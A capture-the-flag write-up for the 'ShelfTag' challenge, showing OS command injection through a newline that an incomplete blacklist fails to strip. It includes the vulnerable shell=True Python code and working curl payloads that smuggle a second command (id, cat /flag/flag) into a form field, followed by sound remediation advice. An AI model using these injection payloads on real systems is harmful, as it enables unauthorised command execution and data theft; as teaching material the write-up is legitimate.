# ShelfTag - OS command injection via a newline the blacklist misses

| | |
|---|---|
| **Challenge** | ShelfTag |
| **Category** | INJ |
| **Points / Difficulty** | 100 / easy |
| **Target** | http://inj2.chal.deti:8041 |
| **Bug** | CWE-78 - OS command injection (incomplete blacklist) |

## Hint
> A label for the shelf, the printer takes a breath, the second line is yours.

## Recon
`POST /label` (`sku`, `text`) builds a shell one-liner from the label text:
```python
BLOCKED = re.compile(r"[;|&$\`]")            # strips ; | & $ `
text = BLOCKED.sub("", request.form["text"])
subprocess.run(f"printf '%s\\n' {text} > /tmp/label_{sku}.txt && cat /tmp/label_{sku}.txt",
               shell=True, ...)
```
`text` is unquoted in the command. The blacklist strips the usual metacharacters
but **not the newline** - and a newline also ends a shell command.

## Approach
Send a raw newline (`%0A`, which a browser text box can't but curl can) so the
first line is consumed by `printf`/redirection and the **second line runs as its
own command**, whose output is `cat`'d back into the label:
```
text = x<newline>cat /flag/flag
```
The flag dir is `drwx--x--x` (traversable, not listable) so `*` won't glob - but
the app source (`/app/app.py`, world-readable) names the file: **`/flag/flag`**.

## Exploitation
```bash
# confirm RCE
curl -s --data "sku=a1&text=x%0Aid" http://inj2.chal.deti:8041/label        # uid=1000(ctf)
# read the flag
curl -s --data "sku=a1&text=x%0Acat%20/flag/flag" http://inj2.chal.deti:8041/label \
  | sed -e 's/.*<pre[^>]*>//' -e 's#</pre>.*##'
```

## Flag
```
flag{f0a8249c525c01297836797fac45592c}
```

## For the report
- **Probed characters:** `; | & $ \`` are all **stripped** by `BLOCKED.sub("")`
  (each breaks the command differently when removed); `\n` (`%0A`) **survives**.
- **Missing character:** the newline - it terminates a command just like `;`.
- **Why "just add `\n` to the blacklist" is still wrong:** a blacklist enumerates
  what you thought of; the shell's grammar has more command separators/escapes
  (`\r`, IFS tricks, etc.), so the next hole reappears. **The fix is to not build
  a shell string from input at all:** call the program with an argument *list*
  (`subprocess.run([...], shell=False)`) so the text is data, never parsed as a
  command - i.e. allowlist by design, not blacklist by patch.

## Root cause & remediation
- **Cause:** untrusted input interpolated into a `shell=True` command (CWE-78),
  "protected" by an incomplete blacklist.
- **Fix:** `shell=False` with an argv list; never concatenate input into a shell
  string; drop privileges and keep the flag unreadable to the service account.
